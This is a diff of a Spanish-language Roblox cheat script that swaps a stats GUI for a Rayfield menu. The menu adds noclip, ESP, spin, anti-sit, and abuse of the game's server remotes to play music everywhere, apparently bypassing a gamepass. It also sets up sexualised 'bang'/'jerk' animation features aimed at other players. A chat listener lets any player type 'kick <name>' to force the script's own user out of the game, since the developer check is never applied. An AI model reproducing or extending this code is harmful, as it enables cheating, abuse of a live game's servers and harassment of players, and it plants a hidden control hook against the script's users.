-        TweenService:Create(settingsBtn, TweenInfo.new(0.2, Enum.EasingStyle.Quart), {
-            BackgroundColor3 = Color3.fromRGB(30, 35, 48)
-        }):Play()
-    end)
-
-    -- Botón link
-    local linkBtn = Instance.new("ImageButton")
-    linkBtn.Size = UDim2.new(0, 24, 0, 24)
-    linkBtn.Position = UDim2.new(1, -34, 0, 10)
-    linkBtn.BackgroundColor3 = Color3.fromRGB(30, 35, 48)
-    linkBtn.Image = "rbxassetid://93628638506572"
-    linkBtn.ImageColor3 = Color3.fromRGB(120, 180, 255)
-    linkBtn.ScaleType = Enum.ScaleType.Fit
-    linkBtn.ZIndex = 3
-    linkBtn.Parent = profile
-
-    local lbCorner = Instance.new("UICorner")
-    lbCorner.CornerRadius = UDim.new(0, 7)
-    lbCorner.Parent = linkBtn
-
-    local lbStroke = Instance.new("UIStroke")
-    lbStroke.Color = Color3.fromRGB(70, 90, 130)
-    lbStroke.Thickness = 1
-    lbStroke.Transparency = 0.6
-    lbStroke.Parent = linkBtn
-
-    linkBtn.MouseEnter:Connect(function()
-        TweenService:Create(linkBtn, TweenInfo.new(0.2, Enum.EasingStyle.Quart), {
-            BackgroundColor3 = Color3.fromRGB(45, 55, 75),
-            Size = UDim2.new(0, 26, 0, 26),
-            Position = UDim2.new(1, -35, 0, 9)
-        }):Play()
-    end)
-    linkBtn.MouseLeave:Connect(function()
-        TweenService:Create(linkBtn, TweenInfo.new(0.2, Enum.EasingStyle.Quart), {
-            BackgroundColor3 = Color3.fromRGB(30, 35, 48),
-            Size = UDim2.new(0, 24, 0, 24),
-            Position = UDim2.new(1, -34, 0, 10)
-        }):Play()
-    end)
-    linkBtn.MouseButton1Click:Connect(function()
-        -- Sin Discord: solo copia un texto genérico o abre nada
-        if setclipboard then setclipboard("Nexus Hub") end
-    end)
-
-    -- Botón ON/OFF anti-hit
-    local toggleBtn = Instance.new("TextButton")
-    toggleBtn.Size = UDim2.new(1, -28, 0, 28)
-    toggleBtn.Position = UDim2.new(0, 14, 1, -38)
-    toggleBtn.BackgroundColor3 = Color3.fromRGB(40, 25, 30)
-    toggleBtn.Text = "OFF"
-    toggleBtn.TextColor3 = Color3.fromRGB(230, 120, 120)
-    toggleBtn.Font = Enum.Font.GothamBold
-    toggleBtn.TextSize = 12
-    toggleBtn.AutoButtonColor = false
-    toggleBtn.ZIndex = 3
-    toggleBtn.Parent = profile
-
-    local tgCorner = Instance.new("UICorner")
-    tgCorner.CornerRadius = UDim.new(0, 8)
-    tgCorner.Parent = toggleBtn
-
-    local tgStroke = Instance.new("UIStroke")
-    tgStroke.Color = Color3.fromRGB(120, 50, 60)
-    tgStroke.Thickness = 1
-    tgStroke.Transparency = 0.4
-    tgStroke.Parent = toggleBtn
-
-    local function setToggleVisual(on)
-        if on then
-            TweenService:Create(toggleBtn, TweenInfo.new(0.25, Enum.EasingStyle.Cubic), {
-                BackgroundColor3 = Color3.fromRGB(20, 45, 35),
-                TextColor3 = Color3.fromRGB(100, 230, 160)
-            }):Play()
-            TweenService:Create(tgStroke, TweenInfo.new(0.25), { Color = Color3.fromRGB(50, 150, 100) }):Play()
-            TweenService:Create(statusDot, TweenInfo.new(0.25), { BackgroundColor3 = Color3.fromRGB(50, 220, 130) }):Play()
-        else
-            TweenService:Create(toggleBtn, TweenInfo.new(0.25, Enum.EasingStyle.Cubic), {
-                BackgroundColor3 = Color3.fromRGB(40, 25, 30),
-                TextColor3 = Color3.fromRGB(230, 120, 120)
-            }):Play()
-            TweenService:Create(tgStroke, TweenInfo.new(0.25), { Color = Color3.fromRGB(120, 50, 60) }):Play()
-            TweenService:Create(statusDot, TweenInfo.new(0.25), { BackgroundColor3 = Color3.fromRGB(230, 70, 80) }):Play()
         end
     end
+end)
 
-    toggleBtn.MouseButton1Click:Connect(function()
-        ANTI_HIT_STATE.enabled = not ANTI_HIT_STATE.enabled
-        toggleBtn.Text = ANTI_HIT_STATE.enabled and "ON" or "OFF"
-        setToggleVisual(ANTI_HIT_STATE.enabled)
-        setAntiHit(ANTI_HIT_STATE.enabled)
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local DEV_USERS = {"Hiimnew928289alt2"}
+getgenv().IRVING_SCRIPT_USER = true
 
-        if ANTI_HIT_STATE.enabled then
-            if not ANTI_HIT_STATE.promptConnection then
-                ANTI_HIT_STATE.promptConnection = ProximityPromptSvc.PromptTriggered:Connect(function(_, player)
-                    if player == LocalPlayer then antiHitTeleport() end
-                end)
-            end
-        elseif ANTI_HIT_STATE.promptConnection then
-            ANTI_HIT_STATE.promptConnection:Disconnect()
-            ANTI_HIT_STATE.promptConnection = nil
+local function findPlayerByName(partial)
+    partial = partial:lower()
+    for _,plr in pairs(Players:GetPlayers()) do
+        local username = plr.Name:lower()
+        local display = plr.DisplayName:lower()
+        if username:find(partial,1,true) or display:find(partial,1,true) then
+            return plr
         end
-    end)
-    toggleBtn.MouseEnter:Connect(function()
-        TweenService:Create(toggleBtn, TweenInfo.new(0.15), {
-            Size = UDim2.new(1, -24, 0, 30), Position = UDim2.new(0, 12, 1, -39)
-        }):Play()
-    end)
-    toggleBtn.MouseLeave:Connect(function()
-        TweenService:Create(toggleBtn, TweenInfo.new(0.15), {
-            Size = UDim2.new(1, -28, 0, 28), Position = UDim2.new(0, 14, 1, -38)
-        }):Play()
-    end)
+    end
+    return nil
+end
 
-    -- ---------- PANEL DE VELOCIDAD ----------
-    local speedPanel = Instance.new("Frame")
-    speedPanel.Size = UDim2.new(0, 200, 0, 46)
-    speedPanel.Position = UDim2.new(1, -210, 1, -56)
-    speedPanel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    speedPanel.BackgroundTransparency = 0.15
-    speedPanel.BorderSizePixel = 0
-    speedPanel.ZIndex = 2
-    speedPanel.Parent = root
-
-    local spCorner = Instance.new("UICorner")
-    spCorner.CornerRadius = UDim.new(0, 18)
-    spCorner.Parent = speedPanel
-
-    local spStroke = Instance.new("UIStroke")
-    spStroke.Color = Color3.fromRGB(60, 140, 255)
-    spStroke.Thickness = 1
-    spStroke.Transparency = 0.2
-    spStroke.Parent = speedPanel
-
-    task.spawn(function()
-        while gui.Parent do
-            TweenService:Create(spStroke, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                Transparency = 0, Thickness = 1.6
-            }):Play()
-            task.wait(2)
-            TweenService:Create(spStroke, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                Transparency = 0.2, Thickness = 1
-            }):Play()
-            task.wait(2)
-        end
-    end)
-
-    local speedTitle = Instance.new("TextLabel")
-    speedTitle.Size = UDim2.new(0, 60, 0, 14)
-    speedTitle.Position = UDim2.new(0, 14, 0, 6)
-    speedTitle.BackgroundTransparency = 1
-    speedTitle.Text = "VELOCIDAD"
-    speedTitle.TextColor3 = Color3.fromRGB(120, 180, 255)
-    speedTitle.Font = Enum.Font.GothamBold
-    speedTitle.TextSize = 9
-    speedTitle.TextXAlignment = Enum.TextXAlignment.Left
-    speedTitle.ZIndex = 3
-    speedTitle.Parent = speedPanel
-
-    local speedValue = Instance.new("TextLabel")
-    speedValue.Size = UDim2.new(0, 80, 0, 20)
-    speedValue.Position = UDim2.new(1, -90, 0, 4)
-    speedValue.BackgroundTransparency = 1
-    speedValue.Text = "0"
-    speedValue.TextColor3 = Color3.fromRGB(240, 244, 255)
-    speedValue.Font = Enum.Font.GothamBold
-    speedValue.TextSize = 16
-    speedValue.TextXAlignment = Enum.TextXAlignment.Right
-    speedValue.ZIndex = 3
-    speedValue.Parent = speedPanel
-
-    local speedUnit = Instance.new("TextLabel")
-    speedUnit.Size = UDim2.new(0, 40, 0, 12)
-    speedUnit.Position = UDim2.new(1, -46, 0, 24)
-    speedUnit.BackgroundTransparency = 1
-    speedUnit.Text = "studs/s"
-    speedUnit.TextColor3 = Color3.fromRGB(140, 150, 170)
-    speedUnit.Font = Enum.Font.GothamMedium
-    speedUnit.TextSize = 9
-    speedUnit.TextXAlignment = Enum.TextXAlignment.Right
-    speedUnit.ZIndex = 3
-    speedUnit.Parent = speedPanel
-
-    local speedBarBg = Instance.new("Frame")
-    speedBarBg.Size = UDim2.new(1, -24, 0, 6)
-    speedBarBg.Position = UDim2.new(0, 12, 1, -12)
-    speedBarBg.BackgroundColor3 = Color3.fromRGB(30, 35, 48)
-    speedBarBg.BorderSizePixel = 0
-    speedBarBg.ZIndex = 3
-    speedBarBg.Parent = speedPanel
-
-    local sbCorner = Instance.new("UICorner")
-    sbCorner.CornerRadius = UDim.new(1, 0)
-    sbCorner.Parent = speedBarBg
-
-    local speedBarFill = Instance.new("Frame")
-    speedBarFill.Size = UDim2.new(0, 0, 1, 0)
-    speedBarFill.BackgroundColor3 = Color3.fromRGB(60, 140, 255)
-    speedBarFill.BorderSizePixel = 0
-    speedBarFill.ZIndex = 4
-    speedBarFill.Parent = speedBarBg
-
-    local sbfCorner = Instance.new("UICorner")
-    sbfCorner.CornerRadius = UDim.new(1, 0)
-    sbfCorner.Parent = speedBarFill
-
-    local MAX_SPEED = 100
-
-    RunService.RenderStepped:Connect(function()
-        if not gui.Parent then return end
-        local char = LocalPlayer.Character
-        local speed = 0
-        if char then
-            local hrp = char:FindFirstChild("HumanoidRootPart")
-            if hrp then
-                local v = hrp.AssemblyLinearVelocity
-                speed = Vector3.new(v.X, 0, v.Z).Magnitude
+local function handleMessage(plr, msg)
+    local function isDev(name)
+        for _,dev in pairs(DEV_USERS) do
+            if dev ~= "" and name == dev then
+                return true
             end
         end
-        speedValue.Text = tostring(math.floor(speed + 0.5))
-        local ratio = math.clamp(speed / MAX_SPEED, 0, 1)
-        TweenService:Create(speedBarFill, TweenInfo.new(0.1, Enum.EasingStyle.Linear), {
-            Size = UDim2.new(ratio, 0, 1, 0)
-        }):Play()
+        return false
+    end
 
-        if speed < 20 then
-            speedBarFill.BackgroundColor3 = Color3.fromRGB(60, 140, 255)
-            speedValue.TextColor3 = Color3.fromRGB(240, 244, 255)
-        elseif speed < 50 then
-            speedBarFill.BackgroundColor3 = Color3.fromRGB(60, 200, 255)
-            speedValue.TextColor3 = Color3.fromRGB(120, 220, 255)
-        elseif speed < 80 then
-            speedBarFill.BackgroundColor3 = Color3.fromRGB(255, 200, 60)
-            speedValue.TextColor3 = Color3.fromRGB(255, 220, 120)
-        else
-            speedBarFill.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
-            speedValue.TextColor3 = Color3.fromRGB(255, 120, 120)
+    msg = msg:lower()
+    local targetName = msg:match("^kick%s+(.+)")
+
+    if targetName then
+        local target = findPlayerByName(targetName)
+        if target and target == LocalPlayer then
+            if getgenv().IRVING_SCRIPT_USER then
+                LocalPlayer:Kick("Expulsado por el desarrollador")
+            end
         end
+    end
+end
+
+for _,plr in pairs(Players:GetPlayers()) do
+    plr.Chatted:Connect(function(msg)
+        handleMessage(plr, msg)
     end)
+end
 
-    -- ---------- PANEL FPS / PING ----------
-    local statsFrame = Instance.new("Frame")
-    statsFrame.Size = UDim2.new(0, 170, 0, 30)
-    statsFrame.Position = UDim2.new(0.5, -85, 0, 34)
-    statsFrame.BackgroundTransparency = 1
-    statsFrame.ZIndex = 2
-    statsFrame.Parent = root
-
-    local statsLayout = Instance.new("UIListLayout")
-    statsLayout.FillDirection = Enum.FillDirection.Horizontal
-    statsLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
-    statsLayout.VerticalAlignment = Enum.VerticalAlignment.Center
-    statsLayout.Padding = UDim.new(0, 10)
-    statsLayout.SortOrder = Enum.SortOrder.LayoutOrder
-    statsLayout.Parent = statsFrame
-
-    local fpsBox = Instance.new("Frame")
-    fpsBox.Size = UDim2.new(0, 75, 0, 24)
-    fpsBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    fpsBox.BackgroundTransparency = 0.5
-    fpsBox.BorderSizePixel = 0
-    fpsBox.ZIndex = 3
-    fpsBox.LayoutOrder = 1
-    fpsBox.Parent = statsFrame
-
-    local fpsCorner = Instance.new("UICorner")
-    fpsCorner.CornerRadius = UDim.new(0, 12)
-    fpsCorner.Parent = fpsBox
-
-    local fpsLabel = Instance.new("TextLabel")
-    fpsLabel.Size = UDim2.new(1, -8, 1, 0)
-    fpsLabel.Position = UDim2.new(0, 4, 0, 0)
-    fpsLabel.BackgroundTransparency = 1
-    fpsLabel.Text = "FPS: --"
-    fpsLabel.TextColor3 = Color3.fromRGB(240, 244, 255)
-    fpsLabel.Font = Enum.Font.GothamBold
-    fpsLabel.TextSize = 12
-    fpsLabel.TextXAlignment = Enum.TextXAlignment.Center
-    fpsLabel.ZIndex = 4
-    fpsLabel.Parent = fpsBox
-
-    local pingBox = Instance.new("Frame")
-    pingBox.Size = UDim2.new(0, 75, 0, 24)
-    pingBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    pingBox.BackgroundTransparency = 0.5
-    pingBox.BorderSizePixel = 0
-    pingBox.ZIndex = 3
-    pingBox.LayoutOrder = 2
-    pingBox.Parent = statsFrame
-
-    local pingCorner = Instance.new("UICorner")
-    pingCorner.CornerRadius = UDim.new(0, 12)
-    pingCorner.Parent = pingBox
-
-    local pingLabel = Instance.new("TextLabel")
-    pingLabel.Size = UDim2.new(1, -8, 1, 0)
-    pingLabel.Position = UDim2.new(0, 4, 0, 0)
-    pingLabel.BackgroundTransparency = 1
-    pingLabel.Text = "PING: --"
-    pingLabel.TextColor3 = Color3.fromRGB(240, 244, 255)
-    pingLabel.Font = Enum.Font.GothamBold
-    pingLabel.TextSize = 12
-    pingLabel.TextXAlignment = Enum.TextXAlignment.Center
-    pingLabel.ZIndex = 4
-    pingLabel.Parent = pingBox
-
-    local fpsCount, fpsTime, fpsValue, pingValue = 0, 0, 0, 0
-
-    task.spawn(function()
-        while gui.Parent do
-            task.wait(1)
-            fpsValue = math.floor(fpsCount / fpsTime + 0.5)
-            fpsCount, fpsTime = 0, 0
-            fpsLabel.Text = "FPS: " .. tostring(fpsValue)
-        end
+Players.PlayerAdded:Connect(function(plr)
+    plr.Chatted:Connect(function(msg)
+        handleMessage(plr, msg)
     end)
-    RunService.RenderStepped:Connect(function(dt)
-        if not gui.Parent then return end
-        fpsCount += 1
-        fpsTime += dt
-    end)
+end)
 
-    task.spawn(function()
-        while gui.Parent do
-            task.wait(1)
-            local ok, result = pcall(function()
-                return Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
+local TeleportService = game:GetService("TeleportService")
+local antifling = false
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid")
+local noclip = false
+local spin = false
+local spinSpeed = 30
+local antisitsystem = false
+local sitConnection = nil
+local espEnabled = false
+local espObjects = {}
+local banging = false
+local bangAnim = nil
+local bangTrack = nil
+local banging2 = false
+local bang2Target = nil
+local bang2Connection = nil
+local bang2Anim = nil
+local bang2Track = nil
+local jerkTool = nil
+local jerkLoop = nil
+local jerkTrack = nil
+local jerking = false
+local lowGraphicsEnabled = false
+local antiAFKConnection = nil
+local flying = false
+local flySpeed = 1
+local flyBV, flyBG, flyConnection
+local normalWalkSpeed = 16
+local AntiSitConnections = AntiSitConnections or {}
+local AntiSitEnabled = false
+
+local function ClearAntiSit()
+    AntiSitEnabled = false
+    for _, conn in ipairs(AntiSitConnections) do
+        if conn then
+            pcall(function()
+                conn:Disconnect()
             end)
-            if ok and result then
-                pingValue = math.floor(result + 0.5)
-                pingLabel.Text = "PING: " .. tostring(pingValue)
+        end
+    end
+    table.clear(AntiSitConnections)
+
+    local character = player.Character
+    if character then
+        local humanoid = character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
+            humanoid:ChangeState(Enum.HumanoidStateType.Running)
+        end
+    end
+end
+
+local function EnableAntiSit()
+    ClearAntiSit()
+    AntiSitEnabled = true
+
+    local function ApplyToCharacter(character)
+        local humanoid = character:WaitForChild("Humanoid", 5)
+        if not humanoid then return end
+        humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
+
+        table.insert(AntiSitConnections,
+            humanoid.StateChanged:Connect(function(_, state)
+                if AntiSitEnabled and state == Enum.HumanoidStateType.Seated then
+                    humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
+                end
+            end)
+        )
+    end
+
+    if player.Character then
+        ApplyToCharacter(player.Character)
+    end
+
+    table.insert(AntiSitConnections,
+        player.CharacterAdded:Connect(function(char)
+            if AntiSitEnabled then
+                ApplyToCharacter(char)
+            end
+        end)
+    )
+
+    table.insert(AntiSitConnections,
+        RunService.Heartbeat:Connect(function()
+            if not AntiSitEnabled then return end
+            local character = player.Character
+            if not character then return end
+            local humanoid = character:FindFirstChildOfClass("Humanoid")
+            if humanoid then
+                humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
+            end
+        end)
+    )
+end
+
+local function SetAntiSit(state)
+    if state then
+        EnableAntiSit()
+    else
+        ClearAntiSit()
+    end
+end
+
+player.CharacterAdded:Connect(function(char)
+    character = char
+    humanoid = char:WaitForChild("Humanoid")
+end)
+
+RunService.Stepped:Connect(function()
+    if noclip and character then
+        for _, v in pairs(character:GetDescendants()) do
+            if v:IsA("BasePart") then
+                v.CanCollide = false
+            end
+        end
+    end
+end)
+
+RunService.RenderStepped:Connect(function()
+    if spin and character and character:FindFirstChild("HumanoidRootPart") then
+        character.HumanoidRootPart.CFrame =
+            character.HumanoidRootPart.CFrame *
+            CFrame.Angles(0, math.rad(spinSpeed), 0)
+    end
+end)
+
+local function findPlayer(name)
+    name = name:lower()
+    for _, plr in pairs(Players:GetPlayers()) do
+        if plr.Name:lower():find(name) or plr.DisplayName:lower():find(name) then
+            return plr
+        end
+    end
+    return nil
+end
+
+RunService.Stepped:Connect(function()
+    if antifling and character and character:FindFirstChild("HumanoidRootPart") then
+        local root = character.HumanoidRootPart
+        root.Velocity = Vector3.zero
+        root.RotVelocity = Vector3.zero
+        for _, v in pairs(character:GetDescendants()) do
+            if v:IsA("BasePart") then
+                v.Velocity = Vector3.zero
+                v.RotVelocity = Vector3.zero
+            end
+        end
+    end
+end)
+
+local function createESP(plr)
+    if plr == player then return end
+    if not plr.Character then return end
+    if espObjects[plr] then return end
+
+    local highlight = Instance.new("Highlight")
+    highlight.Name = "IrvingESP"
+    highlight.FillColor = Color3.fromRGB(0, 150, 255)
+    highlight.OutlineColor = Color3.fromRGB(255,255,255)
+    highlight.FillTransparency = 0.5
+    highlight.Parent = plr.Character
+
+    local billboard = Instance.new("BillboardGui")
+    billboard.Name = "IrvingESPName"
+    billboard.Size = UDim2.new(0,200,0,50)
+    billboard.AlwaysOnTop = true
+    billboard.StudsOffset = Vector3.new(0,3,0)
+
+    local text = Instance.new("TextLabel")
+    text.Size = UDim2.new(1,0,1,0)
+    text.BackgroundTransparency = 1
+    text.Text = plr.DisplayName
+    text.TextColor3 = Color3.fromRGB(255,255,255)
+    text.TextStrokeTransparency = 0
+    text.TextScaled = true
+    text.Parent = billboard
+
+    if plr.Character:FindFirstChild("Head") then
+        billboard.Parent = plr.Character.Head
+    end
+
+    espObjects[plr] = {
+        Highlight = highlight,
+        Billboard = billboard
+    }
+end
+
+local function removeESP(plr)
+    if espObjects[plr] then
+        if espObjects[plr].Highlight then
+            espObjects[plr].Highlight:Destroy()
+        end
+        if espObjects[plr].Billboard then
+            espObjects[plr].Billboard:Destroy()
+        end
+        espObjects[plr] = nil
+    end
+end
+
+local function updateESP()
+    for _, plr in pairs(Players:GetPlayers()) do
+        if espEnabled then
+            createESP(plr)
+        else
+            removeESP(plr)
+        end
+    end
+end
+
+Players.PlayerAdded:Connect(function(plr)
+    plr.CharacterAdded:Connect(function()
+        task.wait(1)
+        if espEnabled then
+            createESP(plr)
+        end
+    end)
+end)
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RE = ReplicatedStorage:WaitForChild("RE")
+local vehicleRemote = RE:WaitForChild("1NoMoto1rVehicle1s")
+local HouseRemote = RE:WaitForChild("1Player1sHous1e")
+local CarRemote = RE:WaitForChild("1Player1sCa1r")
+local NameRemote = RE:WaitForChild("1RPNam1eColo1r")
+local colors = {"Bright red","Lime green","Bright blue","Bright yellow","Bright cyan","Hot pink","Royal purple"}
+local rgbEnabled = false
+local hueValue = 0
+local animSpeed = 0.005
+local vehicleRgb = false
+
+task.spawn(function()
+    while true do
+        hueValue = hueValue + animSpeed
+        if hueValue > 1 then hueValue = 0 end
+        task.wait(0.05)
+    end
+end)
+
+local function UniversalPlay(id)
+    if not id or id == "" then return end
+    pcall(function()
+        local h = RE:FindFirstChild("1Player1sHous1e")
+        if h then h:FireServer("PickHouseMusicText", tostring(id), nil, true) end
+
+        local c = RE:FindFirstChild("1Player1sCa1r")
+        if c then 
+            c:FireServer("Music", tostring(id), nil, true) 
+            c:FireServer("VehicleMusicText", tostring(id), nil, true)
+        end
+
+        local s = RE:FindFirstChild("1NoMoto1rVehicle1s")
+        if s then s:FireServer("PickingScooterMusicText", tostring(id), nil, true) end
+
+        local pt = RE:FindFirstChild("PlayerToolEvent")
+        if pt then pt:FireServer("ToolMusicText", tostring(id), nil, true) end
+
+        local p = RE:FindFirstChild("Props")
+        if p then p:FireServer("PropMusicText", tostring(id), nil, true) end
+
+        local hr = RE:FindFirstChild("1Hors1eRemot1e")
+        if hr then hr:FireServer("HorseMusicText", tostring(id), nil, true) end
+    end)
+end
+
+local function StopMusic()
+    local soundService = game:GetService("SoundService")
+    for _, v in pairs(soundService:GetChildren()) do
+        if v:IsA("Sound") and v.Name == "WelcomeSound" then
+            v:Stop()
+            v:Destroy()
+        end
+    end
+end
+
+local function UniversalStop()
+    UniversalPlay("0") 
+end
+
+local currentSound
+local function NoGamePass(id)
+    if currentSound then
+        currentSound:Stop()
+        currentSound:Destroy()
+    end
+    local welcomeSound = Instance.new("Sound")
+    welcomeSound.Name = "WelcomeSound"
+    welcomeSound.SoundId = "rbxassetid://"..id
+    welcomeSound.Volume = 3
+    welcomeSound.Looped = true
+    welcomeSound.Parent = game:GetService("SoundService")
+    welcomeSound:Play()
+    currentSound = welcomeSound
+end
+
+MusicPassMode = true
+local function AddSong(tab, name, id)
+    tab:CreateSection("🎵 " .. name)
+    tab:CreateButton({
+        Name = "▶️ PLAY",
+        Callback = function()
+            ButtonPSound()
+            if MusicPassMode == true then
+                UniversalPlay(id)
+            elseif MusicPassMode == false then
+                NoGamePass(id)
+            end
+            Rayfield:Notify({
+                Title = name,
+                Content = "¡Reproduciendo en todos lados!",
+                Duration = 2
+            })
+        end
+    })
+    tab:CreateButton({
+        Name = "⭐ Añadir a Favoritos",
+        Callback = function()
+            ButtonPSound()
+            local added = AddFavorite(name, id)
+            if added then
+                Rayfield:Notify({
+                    Title = "⭐ Favorito guardado",
+                    Content = name .. " guardada en tu dispositivo",
+                    Duration = 2
+                })
             else
-                pingLabel.Text = "PING: --"
+                Rayfield:Notify({
+                    Title = "⚠️ Ya es favorito",
+                    Content = "Esta canción ya está guardada",
+                    Duration = 2
+                })
             end
         end
-    end)
+    })
+end
 
-    RunService.Heartbeat:Connect(function()
-        if not gui.Parent then return end
-        if fpsValue >= 50 then
-            fpsLabel.TextColor3 = Color3.fromRGB(80, 230, 130)
-        elseif fpsValue >= 30 then
-            fpsLabel.TextColor3 = Color3.fromRGB(255, 210, 80)
-        else
-            fpsLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
-        end
+local function GetChar()
+    local player = game.Players.LocalPlayer
+    local char = player.Character or player.CharacterAdded:Wait()
+    local humanoid = char:WaitForChild("Humanoid")
+    local hrp = char:WaitForChild("HumanoidRootPart")
+    return char, humanoid, hrp
+end
 
-        if pingValue > 0 and pingValue <= 80 then
-            pingLabel.TextColor3 = Color3.fromRGB(80, 230, 130)
-        elseif pingValue > 0 and pingValue <= 150 then
-            pingLabel.TextColor3 = Color3.fromRGB(255, 210, 80)
-        elseif pingValue > 150 then
-            pingLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
-        else
-            pingLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
-        end
-    end)
+local PlaysTb = Window:CreateTab("▶️ Play", 4483362458) 
+local SongsTb = Window:CreateTab("🎶 Música", 4483362458) 
+local FavTb = Window:CreateTab("⭐ Favoritos", 4483362458)
+local ContactTab = Window:CreateTab("📧 Contacto", 4483362458)
 
-    -- ---------- PANEL SERVER HOP ----------
-    local hopPanel = Instance.new("Frame")
-    hopPanel.Size = UDim2.new(0, 175, 0, 75)
-    hopPanel.Position = UDim2.new(1, -185, 0, 30)
-    hopPanel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    hopPanel.BackgroundTransparency = 0.25
-    hopPanel.BorderSizePixel = 0
-    hopPanel.ZIndex = 2
-    hopPanel.Parent = root
+-- ═══════════════════════════════════════════════════════
+-- PESTAÑA DE FAVORITOS
+-- ═══════════════════════════════════════════════════════
+FavTb:CreateSection("🎵 Tus Canciones Guardadas")
 
-    local hpCorner = Instance.new("UICorner")
-    hpCorner.CornerRadius = UDim.new(0, 14)
-    hpCorner.Parent = hopPanel
-
-    local hpStroke = Instance.new("UIStroke")
-    hpStroke.Color = Color3.fromRGB(60, 140, 255)
-    hpStroke.Thickness = 1
-    hpStroke.Transparency = 0.2
-    hpStroke.Parent = hopPanel
-
-    task.spawn(function()
-        while gui.Parent do
-            TweenService:Create(hpStroke, TweenInfo.new(2.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                Transparency = 0, Thickness = 1.6
-            }):Play()
-            task.wait(2.2)
-            TweenService:Create(hpStroke, TweenInfo.new(2.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                Transparency = 0.2, Thickness = 1
-            }):Play()
-            task.wait(2.2)
-        end
-    end)
-
-    local hopDot = Instance.new("Frame")
-    hopDot.Size = UDim2.new(0, 6, 0, 6)
-    hopDot.Position = UDim2.new(0, 14, 0, 14)
-    hopDot.BackgroundColor3 = Color3.fromRGB(180, 180, 180)
-    hopDot.BorderSizePixel = 0
-    hopDot.ZIndex = 3
-    hopDot.Parent = hopPanel
-
-    local hdCorner = Instance.new("UICorner")
-    hdCorner.CornerRadius = UDim.new(1, 0)
-    hdCorner.Parent = hopDot
-
-    task.spawn(function()
-        while gui.Parent do
-            TweenService:Create(hopDot, TweenInfo.new(0.7, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                Size = UDim2.new(0, 8, 0, 8), Position = UDim2.new(0, 13, 0, 13)
-            }):Play()
-            task.wait(0.7)
-            TweenService:Create(hopDot, TweenInfo.new(0.7, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                Size = UDim2.new(0, 6, 0, 6), Position = UDim2.new(0, 14, 0, 14)
-            }):Play()
-            task.wait(0.7)
-        end
-    end)
-
-    local hopTitle = Instance.new("TextLabel")
-    hopTitle.Size = UDim2.new(0, 100, 0, 18)
-    hopTitle.Position = UDim2.new(0, 28, 0, 6)
-    hopTitle.BackgroundTransparency = 1
-    hopTitle.Text = "Server Hop"
-    hopTitle.TextColor3 = Color3.fromRGB(240, 244, 255)
-    hopTitle.Font = Enum.Font.GothamBold
-    hopTitle.TextSize = 13
-    hopTitle.TextXAlignment = Enum.TextXAlignment.Left
-    hopTitle.ZIndex = 3
-    hopTitle.Parent = hopPanel
-
-    local hopCountBtn = Instance.new("TextButton")
-    hopCountBtn.Size = UDim2.new(0, 32, 0, 26)
-    hopCountBtn.Position = UDim2.new(0, 14, 0, 36)
-    hopCountBtn.BackgroundColor3 = Color3.fromRGB(20, 25, 35)
-    hopCountBtn.Text = "1"
-    hopCountBtn.TextColor3 = Color3.fromRGB(240, 244, 255)
-    hopCountBtn.Font = Enum.Font.GothamBold
-    hopCountBtn.TextSize = 13
-    hopCountBtn.AutoButtonColor = false
-    hopCountBtn.ZIndex = 3
-    hopCountBtn.Parent = hopPanel
-
-    local hcCorner = Instance.new("UICorner")
-    hcCorner.CornerRadius = UDim.new(0, 6)
-    hcCorner.Parent = hopCountBtn
-
-    local hcStroke = Instance.new("UIStroke")
-    hcStroke.Color = Color3.fromRGB(60, 100, 160)
-    hcStroke.Thickness = 1
-    hcStroke.Transparency = 0.3
-    hcStroke.Parent = hopCountBtn
-
-    local hopBtn = Instance.new("TextButton")
-    hopBtn.Size = UDim2.new(1, -58, 0, 26)
-    hopBtn.Position = UDim2.new(0, 52, 0, 36)
-    hopBtn.BackgroundColor3 = Color3.fromRGB(30, 60, 100)
-    hopBtn.Text = "ON"
-    hopBtn.TextColor3 = Color3.fromRGB(120, 200, 255)
-    hopBtn.Font = Enum.Font.GothamBold
-    hopBtn.TextSize = 12
-    hopBtn.AutoButtonColor = false
-    hopBtn.ZIndex = 3
-    hopBtn.Parent = hopPanel
-
-    local hbCorner = Instance.new("UICorner")
-    hbCorner.CornerRadius = UDim.new(0, 6)
-    hbCorner.Parent = hopBtn
-
-    local hbStroke = Instance.new("UIStroke")
-    hbStroke.Color = Color3.fromRGB(60, 140, 255)
-    hbStroke.Thickness = 1
-    hbStroke.Transparency = 0.3
-    hbStroke.Parent = hopBtn
-
-    local minPlayers = 1
-
-    local function setHopDot(color)
-        TweenService:Create(hopDot, TweenInfo.new(0.2), { BackgroundColor3 = color }):Play()
+local function BuildFavoritesUI()
+    local favs = GetFavorites()
+    
+    if #favs == 0 then
+        FavTb:CreateParagraph({
+            Title = "📭 No tienes favoritos aún",
+            Content = "Ve a la pestaña Música y dale a ⭐ en las canciones que te gusten. Se guardarán aquí automáticamente."
+        })
+        return
     end
+    
+    FavTb:CreateParagraph({
+        Title = "📋 Total: " .. #favs .. " canciones guardadas",
